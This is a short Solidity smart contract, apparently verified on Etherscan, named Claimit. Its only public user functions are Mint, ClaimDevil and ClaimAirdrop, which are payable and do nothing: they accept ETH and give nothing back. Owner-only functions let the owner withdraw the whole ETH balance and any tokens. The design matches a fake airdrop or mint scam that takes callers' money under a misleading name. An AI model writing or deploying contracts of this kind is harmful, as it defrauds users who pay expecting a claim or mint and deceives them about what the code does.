/**
 *Submitted for verification at Etherscan.io on 2023-03-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface ERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract Claimit {

    /* 
    
        2023 - 2024
    
    */

    address private owner;      // current owner of the contract
    address private newOwner;   // new owner address

    constructor(){
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function withdrawBalance(address payable _to) external onlyOwner {
        require(_to != address(0), "Invalid recipient address");
        uint256 balance = address(this).balance;
        (bool success, ) = _to.call{value: balance}("");
        require(success, "WITHDRAW FAILED!");
    }

    function sendERC20Token(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
        require(tokenAddress != address(0), "Invalid token address");
        require(recipient != address(0), "Invalid recipient address");
        require(amount > 0, "Invalid token amount");

        ERC20 token = ERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Token transfer failed");
    }

    function setNewOwner(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "Invalid new owner address");
        newOwner = _newOwner;
    }

    function claimOwnership() external {
        require(msg.sender == newOwner, "Only the new owner can claim ownership");
        owner = newOwner;
        newOwner = address(0);
    }

    function Mint() public payable {
    }

    function ClaimDevil() public payable {
    }

    function ClaimAirdrop() public payable {
    }


}